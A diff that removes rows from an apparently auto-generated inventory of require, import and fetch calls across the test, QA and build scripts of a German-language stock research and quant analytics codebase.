-| quant/tests/launch-gates.test.mjs | require(join(ROOT, "quant/engines/company-master.js")) |
-| quant/tests/listing-continuity.test.mjs | require(join(ROOT, "quant/engines/survivorship-control.js")) |
-| quant/tests/live-candle.test.mjs | require(join(engines, "realtime", "transport.js")) |
-| quant/tests/live-candle.test.mjs | require(join(engines, "realtime", "bar-merge.js")) |
-| quant/tests/live-candle.test.mjs | require(join(root, "providers", "tiingo", "realtime.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "instrument-classification.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "market-factors.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "market-quality.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "realtime", "subscription-tiers.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "technical", "feature-store.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "technical", "momentum-engine.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "chart-ranges.js")) |
-| quant/tests/market-scale.test.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "market-client.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "market-client.js")) |
-| quant/tests/market-scale.test.mjs | require(join(engines, "market-client.js")) |
-| quant/tests/naming-contract.test.mjs | require(), die Seite in einem DOM-Doppel mit den echten Dateien. |
-| quant/tests/naming-contract.test.mjs | require(join(ROOT, "quant/engines/company-naming-contract.js")) |
-| quant/tests/naming-contract.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/naming-contract.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/naming-contract.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/naming-contract.test.mjs | require(join(ROOT, "quant/app/view-model.js")) |
-| quant/tests/no-mock-in-product.test.mjs | import(new URL("../../scripts/vu2/build-release.mjs", import.meta.url)) |
-| quant/tests/ownership-signals.test.mjs | require(join(root, "quant/engines/ownership-signals.js")) |
-| quant/tests/pacemaker.test.mjs | require(join(root, "quant", "engines", "realtime", "pacemaker.js")) |
-| quant/tests/pattern-unavailability.test.mjs | require() geprueft. Die |
-| quant/tests/pattern-unavailability.test.mjs | require(join(root, "quant/api/product-services.js")) |
-| quant/tests/pattern-unavailability.test.mjs | require(join(root, "quant/engines/display-policy.js")) |
-| quant/tests/pattern-unavailability.test.mjs | require(join(root, "quant/engines/query.js")) |
-| quant/tests/pattern-unavailability.test.mjs | require(join(root, "quant/app/view-model.js")) |
-| quant/tests/persist-fundamentals.test.mjs | import(join(root, "scripts", "quant", "sec", "persist-fundamentals.mjs")) |
-| quant/tests/persist-fundamentals.test.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| quant/tests/pipeline-freshness-contract.test.mjs | import(join(ROOT, "scripts/quant/measure-pipeline-freshness.mjs")) |
-| quant/tests/plain-verdict.test.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| quant/tests/plain-verdict.test.mjs | require(join(ROOT, "quant/engines/plain-verdict.js")) |
-| quant/tests/portfolio-standard.test.mjs | require(ROOT + '/quant/engines/portfolio-risk.cjs') |
-| quant/tests/portfolio-standard.test.mjs | require(ROOT + '/quant/engines/portfolio-construction.cjs') |
-| quant/tests/portfolio-standard.test.mjs | require(ROOT + '/quant/engines/portfolio-pit-factors.cjs') |
-| quant/tests/portfolio-standard.test.mjs | require(ROOT + '/quant/engines/portfolio-backtest.cjs') |
-| quant/tests/portfolio-standard.test.mjs | require(ROOT + '/scripts/quant/portfolio/model-portfolios.cjs') |
-| quant/tests/portfolio-standard.test.mjs | require(ROOT + '/scripts/quant/portfolio/export-public-model-portfolios.cjs') |
-| quant/tests/published-close.test.mjs | require(join(ROOT, "quant/engines/published-close.js")) |
-| quant/tests/rejection-lifecycle.test.mjs | require(join(root, "quant", "engines", "rejection-lifecycle.js")) |
-| quant/tests/research-v8-classification.test.mjs | require(${JSON.stringify(join(f.source,'scripts/quant/materialize-real-backtest-read.cjs'))}) |
-| quant/tests/screener-hit-row.test.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| quant/tests/screener-hit-row.test.mjs | require(join(ROOT, "quant/engines/plain-verdict.js")) |
-| quant/tests/screener-hit-row.test.mjs | require(join(ROOT, "quant/app/view-model.js")) |
-| quant/tests/screener-surface.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/screener-surface.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/screener-surface.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/screener-surface.test.mjs | require(join(ROOT, "quant/api/screener-workspace.js")) |
-| quant/tests/screener-surface.test.mjs | require(join(ROOT, "quant/app/view-model.js")) |
-| quant/tests/screener-surface.test.mjs | require(join(ROOT, "quant/engines/quant-methodology-contract.js")) |
-| quant/tests/sec-panel-published-close.test.mjs | require(join(ROOT, "quant/engines/published-close.js")) |
-| quant/tests/security-master-duplicate-resolution.test.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| quant/tests/security-master-duplicate-resolution.test.mjs | require(join(root, "core", "identity.js")) |
-| quant/tests/security-master-duplicate-resolution.test.mjs | import(join(root, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) |
-| quant/tests/security-master-rename-continuation.test.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| quant/tests/security-master-rename-continuation.test.mjs | require(join(root, "core", "identity.js")) |
-| quant/tests/security-master-rename-continuation.test.mjs | import(join(root, "scripts", "market", "lib", "security-master-duplicate-resolution.mjs")) |
-| quant/tests/security-master-rename-continuation.test.mjs | import(join(root, "scripts", "market", "build-company-names.mjs")) |
-| quant/tests/security-master-rename-continuation.test.mjs | import(join(root, "scripts", "market", "build-security-master-approval-list.mjs")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/engines/instrument-classification.js")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/engines/company-master.js")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/engines/journey-shape.js")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/engines/intelligence-brief.js")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/security-type-safety.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/source-state.test.mjs | require(join(root, "quant", "engines", "realtime", "source-state.js")) |
-| quant/tests/stock-page-payload.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/stock-page-payload.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/stock-page-payload.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/stock-page-payload.test.mjs | require(join(ROOT, "quant/engines/company-master.js")) |
-| quant/tests/stock-page-payload.test.mjs | require(join(ROOT, "core/identity.js")) |
-| quant/tests/stock-page-shards.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/stock-page-shards.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/stock-page-shards.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/stock-page-shards.test.mjs | require(join(ROOT, "quant/engines/company-master.js")) |
-| quant/tests/stock-page-shards.test.mjs | require(join(ROOT, "core/identity.js")) |
-| quant/tests/technical-ap8-l1.test.mjs | require(join(root, "quant/engines/technical/screen-row.js")) |
-| quant/tests/technical-ap8-l1.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| quant/tests/technical-ap8-l1.test.mjs | require(join(root, "quant/engines/technical/query-text.js")) |
-| quant/tests/technical-ap8-l1.test.mjs | require(join(root, "quant/engines/technical/indicators.js")) |
-| quant/tests/technical-ap8-l2.test.mjs | require(join(root, "quant/engines/technical/screen-row.js")) |
-| quant/tests/technical-ap8-l2.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| quant/tests/technical-ap8-l2.test.mjs | require(join(root, "quant/engines/technical/query-text.js")) |
-| quant/tests/technical-ap8-l2.test.mjs | require(join(root, "quant/engines/technical/indicators.js")) |
-| quant/tests/technical-ap8-l3.test.mjs | require(join(root, "quant/engines/technical/screen-row.js")) |
-| quant/tests/technical-ap8-l3.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| quant/tests/technical-ap8-l3.test.mjs | require(join(root, "quant/engines/technical/query-text.js")) |
-| quant/tests/technical-ap8-l4.test.mjs | require(join(root, "quant/engines/technical/screen-row.js")) |
-| quant/tests/technical-ap8-l4.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| quant/tests/technical-ap8-l4.test.mjs | require(join(root, "quant/engines/technical/query-text.js")) |
-| quant/tests/technical-ap8-l5.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| quant/tests/technical-ap8-l5.test.mjs | require(join(root, "quant/engines/technical/query-text.js")) |
-| quant/tests/technical-unavailability.test.mjs | require() geprueft. |
-| quant/tests/ti-data-freshness.test.mjs | require(join(ROOT, "ask/engine.js")) |
-| quant/tests/ti-mission4.test.mjs | require(join(ROOT, "quant/engines/technical/ti/context.js")) |
-| quant/tests/ti-mission4.test.mjs | require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) |
-| quant/tests/ti-mission4.test.mjs | require(join(ROOT, "quant/engines/technical/ti/alerts.js")) |
-| quant/tests/ti-mission4.test.mjs | import(join(ROOT, "scripts/technical/lib/ti-data.mjs")) |
-| quant/tests/ti-mission4.test.mjs | import(join(ROOT, "quant/tests/elliott-corpus.mjs")) |
-| quant/tests/ti-mission4.test.mjs | require(join(ROOT, "quant/engines/technical/canonical-bars.js")) |
-| quant/tests/ti-mission4.test.mjs | require(join(ROOT, "quant/engines/technical/canonical-bars.js")) |
-| quant/tests/ti-mission4.test.mjs | import(join(ROOT, "scripts/technical/lib/ti-product.mjs")) |
-| quant/tests/ti-mission4.test.mjs | import(join(ROOT, "scripts/technical/lib/ti-product.mjs")) |
-| quant/tests/universe-list.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/universe-list.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/universe-list.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/universe-list.test.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| quant/tests/universe-list.test.mjs | fetch(", "https://", "axios", "tiingoRequest", "apiKey", "process.env.TIINGO"]) { |
-| quant/tests/us-security-master-artefacts.test.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| quant/tests/us-security-master.test.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| quant/tests/us-security-master.test.mjs | require(join(root, "quant", "engines", "instrument-classification.js")) |
-| quant/tests/v10-corporate-actions.test.mjs | require(path.join(root, 'quant/engines/research-weekly-loader.cjs')) |
-| quant/tests/v10-corporate-actions.test.mjs | require(path.join(root, 'quant/engines/research-ca-evidence.cjs')) |
-| quant/tests/v10-corporate-actions.test.mjs | require(path.join(root, 'quant/engines/corporate-action-evidence.js')) |
-| quant/tests/v10-corporate-actions.test.mjs | require(outs[0]) |
-| quant/tests/v10-factor.test.mjs | require(join(ROOT, 'scripts/quant/v10/factor/factors.cjs')) |
-| quant/tests/v10-factor.test.mjs | require(join(ROOT, 'scripts/quant/v10/factor/study.cjs')) |
-| quant/tests/v10-factor.test.mjs | require(join(ROOT, 'scripts/quant/v10/factor/panel.cjs')) |
-| quant/tests/v10-factor.test.mjs | require(join(ROOT, 'scripts/quant/v10/factor/common.cjs')) |
-| quant/tests/v10-factor.test.mjs | require(join(ROOT, 'quant/engines/research-contract.cjs')) |
-| quant/tests/v10-factor.test.mjs | require(join(ROOT, 'quant/engines/fundamental-inputs.js')) |
-| quant/tests/v10-setup.test.mjs | require(join(ROOT, "scripts/quant/v10/setup/setup-lib.cjs")) |
-| quant/tests/v10-setup.test.mjs | require(join(ROOT, "scripts/quant/v10/setup/setup-original-inventory.cjs")) |
-| quant/tests/v10-setup.test.mjs | require(join(ROOT, "scripts/quant/v10/setup/build-setup-independence-decision.cjs")) |
-| quant/tests/v10-setup.test.mjs | require(join(ROOT, "quant/engines/research-validation.cjs")) |
-| quant/tests/v10-setup.test.mjs | import(join(ROOT, "scripts/quant/build-setup-outcomes.mjs")) |
-| quant/tests/v12-indexpop.test.mjs | require(path.join(ROOT, 'scripts/quant/v12/indexpop/lib.cjs')) |
-| quant/tests/v12-largecap.test.mjs | require(ie) |
-| quant/tests/v12-listref.test.mjs | require(path.join(ROOT, 'scripts/quant/v12/listref/reflib.cjs')) |
-| quant/tests/v12-listref.test.mjs | require(path.join(ROOT, 'scripts/quant/v12/listref/build_reference.cjs')) |
-| quant/tests/v12-listref.test.mjs | require(path.join(ROOT, 'quant/engines/research-listing-reference.cjs')) |
-| quant/tests/v12-requal.test.mjs | require(path.join(ROOT, 'scripts/quant/v12/requal/lib.cjs')) |
-| quant/tests/v12-requal.test.mjs | require(path.join(ROOT, 'scripts/quant/v12/requal/p6-strategies.cjs')) |
-| quant/tests/v12-requal.test.mjs | require(path.join(ROOT, 'scripts/quant/v12/requal/p5c-factor.cjs')) |
-| quant/tests/v12-requal.test.mjs | require(path.join(ROOT, 'scripts/quant/v12/requal/plan.cjs')) |
-| quant/tests/v12-spxpop.test.mjs | require(path.join(ROOT, 'quant/engines/research-index-population.cjs')) |
-| quant/tests/v13-studies.test.mjs | require(ROOT + '/scripts/quant/v13/studies/lib.cjs') |
-| quant/tests/v13-studies.test.mjs | require(ROOT + '/scripts/quant/v13/studies/run-s3.cjs') |
-| quant/tests/v13-studies.test.mjs | require(ROOT + '/quant/engines/research-delisted-series.cjs') |
-| quant/tests/v13b-f1w.test.mjs | require(ROOT + '/scripts/quant/v13b/f1w/lib.cjs') |
-| quant/tests/v13b-f1w.test.mjs | require(ROOT + '/quant/engines/research-delisted-series.cjs') |
-| quant/tests/v13c-study.test.mjs | require(ROOT + '/scripts/quant/v13c/lib.cjs') |
-| quant/tests/v13c-study.test.mjs | require(ROOT + '/scripts/quant/v13c/run-s3.cjs') |
-| quant/tests/valuation-consistency.test.mjs | require() geprueft), der Kennzahlenkasten ist der Abschnitt |
-| quant/tests/valuation-consistency.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/valuation-consistency.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/valuation-consistency.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/valuation-consistency.test.mjs | require(join(ROOT, "quant/engines/fundamental-inputs.js")) |
-| quant/tests/valuation-consistency.test.mjs | require(join(ROOT, "quant/app/view-model.js")) |
-| quant/tests/zero-cost-guard.test.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| quant/tests/zero-cost-guard.test.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| quant/ui/release-guard.js | fetch(ID_URL + '?t=' + now(), { cache: 'no-store', credentials: 'omit' }) |
-| quant/ui/shell.js | fetch(path, { cache: "no-cache" }) |
-| quant/ui/shell.js | fetch(path, { cache: "no-cache" }).then(function (res) { |
-| screener/engine/adapters.js | fetch(url, Object.assign({ cache: 'default' }, opts &#124;&#124; {})).then(function (r) { |
-| scripts/access-gate/browser-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') |
-| scripts/access-gate/runtime.js | fetch(loader.getAttribute('data-content')) |
-| scripts/account/browser-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') |
-| scripts/account/check-auto-env.mjs | fetch(`https://api.github.com/repos/${REPO}/environments/account-auto${p}`, |
-| scripts/account/journey-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') |
-| scripts/account/journey-qa.mjs | fetch(base + '/v1/plans')).json()).newsletter) |
-| scripts/account/journey-qa.mjs | fetch(b + '/v1/me', {credentials: 'include', headers: {'X-VU-Client': 'web'}})).json(), base) |
-| scripts/account/journey-qa.mjs | fetch(b + '/v1/session', {credentials: 'include', headers: {'X-VU-Client': 'web'}})).json(), base) |
-| scripts/account/journey-qa.mjs | fetch(`${base}/__dev/tester?email=${encodeURIComponent(email)}`, {method: 'POST'}) |
-| scripts/account/journey-qa.mjs | fetch(`${base}/__dev/tester?email=${encodeURIComponent(email)}`, {method: 'POST'}) |
-| scripts/account/journey-qa.mjs | fetch(`${base}/__dev/sepa/latest/paid`, {method: 'POST'}) |
-| scripts/account/journey-qa.mjs | fetch(`${base}/__dev/cron`, {method: 'POST'}) |
-| scripts/account/journey-qa.mjs | fetch(`${base}/__dev/brevo/confirm?email=${encodeURIComponent(email)}`, {method: 'POST'}) |
-| scripts/account/journey-qa.mjs | fetch(`${base}/__dev/cron`, {method: 'POST'}) |
-| scripts/account/quant-watch-coupling-qa.mjs | fetch('/quant/data/universe/instruments/' + globalThis.VUCore.Identity.shardKey('MSFT') + '.json')).json()).instruments.find(i => i.symbol === 'MSFT' && i.active).ins |
-| scripts/account/release-guard.mjs | fetch(api + p, {signal: AbortSignal.timeout(20000)}) |
-| scripts/account/watchlist-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') |
-| scripts/analysts/fetch-consensus.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/analysts/fetch-consensus.mjs | fetch(url, { headers, signal: AbortSignal.timeout(30000) }) |
-| scripts/analysts/probe-consensus.mjs | fetch(url, { headers, signal: AbortSignal.timeout(30000) }) |
-| scripts/ci/pipeline-alarm.mjs | fetch(base + pfad, { |
-| scripts/ci/push-with-retry.sh | fetch                  (Standard 3) |
-| scripts/ci/supertrader-chain.mjs | fetch(base + "/repos/" + repo + path, Object.assign({}, init, { headers, signal: AbortSignal.timeout(20000) })) |
-| scripts/company_intelligence/browser-qa.mjs | fetch() |
-| scripts/company_intelligence/browser-qa.mjs | fetch(), body=await response.json() |
-| scripts/company_intelligence/browser-qa.mjs | fetch(),body=await response.json() |
-| scripts/company_intelligence/browser-qa.mjs | fetch(),body=await response.json() |
-| scripts/company_intelligence/browser-qa.mjs | fetch(),body=await response.json(),past=new Date(Date.now()-3600000).toISOString() |
-| scripts/company_intelligence/browser-qa.mjs | fetch(),body=await response.json() |
-| scripts/company_intelligence/browser-qa.mjs | fetch(),body=await response.json() |
-| scripts/company_intelligence/browser-qa.mjs | fetch(),body=await response.json() |
-| scripts/company_intelligence/discover-beta-qa.mjs | fetch(),body=await response.json() |
-| scripts/company_intelligence/discover-beta-qa.mjs | fetch(),body=await response.json() |
-| scripts/company_intelligence/numeric-band-review.mjs | fetch(url,init),limits:{requestsPerMinute:3,requestsPerHour:3,requestsPerDay:3,maxRetries:0,concurrency:1}}) |
-| scripts/company_intelligence/numeric-band-review.mjs | fetch(sourceUrl,{headers:{'User-Agent':'VisionUniverseResearch info@visionuniverse.de'},signal:AbortSignal.timeout(30000)}) |
-| scripts/company_intelligence/propagation-proof.mjs | fetch(url, {cache: 'no-store', headers: {'cache-control': 'no-cache', pragma: 'no-cache'}, signal: AbortSignal.timeout(timeout)}) |
-| scripts/company_intelligence/refresh-qa.mjs | fetch(origin+'/release-delivery.json?refresh='+Date.now())).json() |
-| scripts/company_intelligence/refresh-qa.mjs | fetch(origin+'/company-intelligence/data/'+path+'?refresh='+Date.now())).arrayBuffer()):readFileSync(join(directory,path)) |
-| scripts/company_intelligence/refresh-qa.mjs | fetch() |
-| scripts/company_intelligence/runtime-candidate.mjs | fetch(origin+p+'?refresh-proof='+Date.now(),{signal:AbortSignal.timeout(30000)}) |
-| scripts/company_intelligence/scheduler-gate.mjs | fetch(base+path,{signal:AbortSignal.timeout(15000),headers:{accept:'application/vnd.github+json','x-github-api-version':'2022-11-28',...(token?{authorization:'Bearer  |
-| scripts/company_intelligence/tests/legacy-restore.test.mjs | import(pathToFileURL(file).href+'?m='+Math.random()) |
-| scripts/company_intelligence/tests/refreeze-auto.test.mjs | import(pathToFileURL(file).href) |
-| scripts/company_intelligence/tests/refresh-dispatch-wait.test.mjs | import('data:text/javascript |
-| scripts/company_intelligence/tests/refresh-watchdog.test.mjs | import(pathToFileURL(modulePath).href) |
-| scripts/company_intelligence/tests/refresh-watchdog.test.mjs | import(pathToFileURL(join(repoRoot,'scripts/company_intelligence/scheduler-gate.mjs')).href) |
-| scripts/company_intelligence/tests/rollback-cas.test.mjs | import('data:text/javascript |
-| scripts/company_intelligence/tests/rollback-cas.test.mjs | import('data:text/javascript |
-| scripts/company_intelligence/tests/scheduler-gate.test.mjs | import(gateUrl) |
-| scripts/company_intelligence/tests/test_wordpress_news.py | fetch(h,s) |
-| scripts/company_intelligence/universe-browser-qa.mjs | fetch(origin+'/company-intelligence-refresh.json?qa='+Date.now())).json():null |
-| scripts/company_intelligence/universe-browser-qa.mjs | fetch(origin+'/release-delivery.json?qa='+Date.now())).json() |
-| scripts/company_intelligence/universe-release.mjs | fetch('https://research.visionuniverse.de/company-intelligence-delivery.json?freeze='+Date.now())).json() |
-| scripts/company_intelligence/universe-release.mjs | fetch('https://research.visionuniverse.de/release-delivery.json?freeze='+Date.now())).json() |
-| scripts/company_intelligence/verify-pilot-delivery.mjs | fetch(base+encodeURIComponent(path)) |
-| scripts/company_intelligence/wordpress_news.py | fetch(http, source): |
-| scripts/company_intelligence/wordpress_news.py | fetch(http, source) |
-| scripts/company_intelligence/wordpress_news.py | fetch(http, source) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "core", "data-quality.js")) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "core", "identity.js")) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "quant", "engines", "realtime", "trading-session.js")) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "core", "listing-staleness.js")) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "quant", "engines", "technical", "technical-query.js")) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "quant", "engines", "technical", "multi-timeframe.js")) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "quant", "engines", "technical", "screen-row.js")) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "quant", "engines", "technical", "screener-contract.js")) |
-| scripts/core/data-quality.mjs | require(tplPath), ds = TQ.createDataset(twArt) |
-| scripts/core/data-quality.mjs | require(join(REPO_ROOT, "quant", "engines", "published-close.js")) |
-| scripts/core/diagnose.mjs | require(join(REPO_ROOT, "core", "diagnose.js")) |
-| scripts/core/diagnose.mjs | require(join(REPO_ROOT, "core", "listing-staleness.js")) |
-| scripts/core/diagnose.mjs | require(join(REPO_ROOT, "core", "client.js")) |
-| scripts/core/lib.mjs | fetch(url, { headers: { "cache-control": "no-cache" } }) |
-| scripts/core/lib.mjs | require(join(root, "core", "health.js")), |
-| scripts/core/lib.mjs | require(join(root, "core", "identity.js")), |
-| scripts/core/lib.mjs | require(join(root, "quant", "engines", "realtime", "trading-session.js")), |
-| scripts/core/r2-audit.mjs | fetch("https://api.cloudflare.com/client/v4" + path, { |
-| scripts/dashboard/update_news.mjs | fetch(url, options) |
-| scripts/diagnose/adjustment-steps.mjs | require(join(root, "quant", "engines", "history-store.js")) |
-| scripts/diagnose/adjustment-steps.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| scripts/diagnose/adjustment-steps.mjs | require(join(root, "quant", "engines", "market-quality.js")) |
-| scripts/diagnose/adjustment-steps.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| scripts/diagnose/adjustment-steps.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| scripts/diagnose/coverage-delta.mjs | require(join(root, "quant", "engines", "history-store.js")) |
-| scripts/diagnose/coverage-delta.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| scripts/diagnose/coverage-delta.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs"))).createFsDriver(localRoot) |
-| scripts/diagnose/coverage-delta.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs"))).createS3DriverFromEnv() |
-| scripts/discover/assert-source-state-coverage.mjs | require(join(engines, "realtime", "source-state.js")) |
-| scripts/discover/assert-source-state-coverage.mjs | require(join(engines, "realtime", "market-hours.js")) |
-| scripts/discover/assert-source-state-coverage.mjs | require(join(engines, "realtime", "trading-session.js")) |
-| scripts/discover/assert-source-state-coverage.mjs | require(join(root, "quant", "config", "market-calendar.json")) |
-| scripts/discover/assert-source-state-coverage.mjs | require(join(root, "core", "identity.js")) |
-| scripts/discover/browser-qa-direct.mjs | require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES + '/playwright') |
-| scripts/discover/browser-qa-direct.mjs | fetch(base + '/release-id.json') |
-| scripts/discover/browser-qa-maerkte.mjs | require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') |
-| scripts/discover/browser-qa-realtime.mjs | require(join(root, "quant", "engines", "realtime", "market-hours.js")) |
-| scripts/discover/browser-qa.mjs | require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') |
-| scripts/discover/build-company-logos.mjs | fetch(url, { ...opts, headers: { "User-Agent": USER_AGENT, "Api-User-Agent": USER_AGENT, ...(opts.headers &#124;&#124; {}) } }) |
-| scripts/discover/build-company-logos.mjs | fetch(url, { redirect: "follow", signal: AbortSignal.timeout(15000), |
-| scripts/discover/build-discover-data.mjs | import(join(root, "scripts", "market", "universe-source.mjs")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "quant", "engines", "market-factors.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "quant", "engines", "published-close.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "quant", "engines", "return-series.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "quant", "engines", "display-policy.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "contract.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "high52w.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "scoring.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "indicators.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "technical-intelligence.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "klartext.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "unternehmen.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "fundamentals.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "relevance.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "discovery-eligibility.js")) |
-| scripts/discover/build-discover-data.mjs | require(join(root, "discover", "engines", "im-blick.js")) |
-| scripts/discover/build-im-blick-live.mjs | require(join(root, "discover", "engines", "im-blick.js")) |
-| scripts/discover/build-im-blick-live.mjs | require(join(root, "discover", "engines", "contract.js")) |
-| scripts/discover/build-im-blick-live.mjs | require(join(root, "core", "identity.js")) |
-| scripts/discover/build-im-blick-live.mjs | require(join(root, "discover", "engines", "refresh-plan.js")) |
-| scripts/discover/build-im-blick-live.mjs | require(join(root, "quant", "engines", "realtime", "trading-session.js")) |
-| scripts/discover/check-im-blick-live.mjs | require(join(ROOT, "discover", "engines", "refresh-plan.js")) |
-| scripts/discover/check-im-blick-live.mjs | fetch(url, { cache: "no-store", signal: AbortSignal.timeout(20000) }) |
-| scripts/discover/europe-continuity-live-qa.mjs | require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') |
-| scripts/discover/europe-public-live-qa.mjs | import(sourceRoot+'/scripts/access-gate/build.mjs') |
-| scripts/discover/global-live-qa.mjs | require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') |
-| scripts/discover/lazy-fault-qa.mjs | require((process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES &#124;&#124; '') + '/playwright') |
-| scripts/discover/logo-candidates.mjs | fetch(url, { headers: { "User-Agent": ua, Accept: "application/json,text/html,image/*,*/*" }, signal: AbortSignal.timeout(20000) }) |
-| scripts/discover/replay-im-blick.mjs | import(join(root, "scripts", "market", "universe-source.mjs")) |
-| scripts/discover/replay-im-blick.mjs | require(join(root, "discover", "engines", "scoring.js")) |
-| scripts/discover/replay-im-blick.mjs | require(join(root, "discover", "engines", "high52w.js")) |
-| scripts/discover/replay-im-blick.mjs | require(join(root, "discover", "engines", "discovery-eligibility.js")) |
-| scripts/discover/replay-im-blick.mjs | require(join(root, "discover", "engines", "im-blick.js")) |
-| scripts/discover/verify-discover-data.mjs | require(join(root, "discover", "engines", "contract.js")) |
-| scripts/discover/verify-discover-data.mjs | require(join(root, "discover", "engines", "klartext.js")) |
-| scripts/discover/verify-discover-data.mjs | require(join(root, "discover", "engines", "scoring.js")) |
-| scripts/discover/verify-discover-data.mjs | require(join(root, "discover", "engines", "high52w.js")) |
-| scripts/discover/verify-discover-data.mjs | require(join(root, "quant", "engines", "display-policy.js")) |
-| scripts/discover/verify-discover-data.mjs | require(join(root, "discover", "methodology", "discover-v1.json")) |
-| scripts/discover/verify-discover-data.mjs | require(join(root, "discover", "engines", "relevance.js")) |
-| scripts/discover/verify-discover-data.mjs | import(join(root, "scripts", "market", "preview-scope.mjs")) |
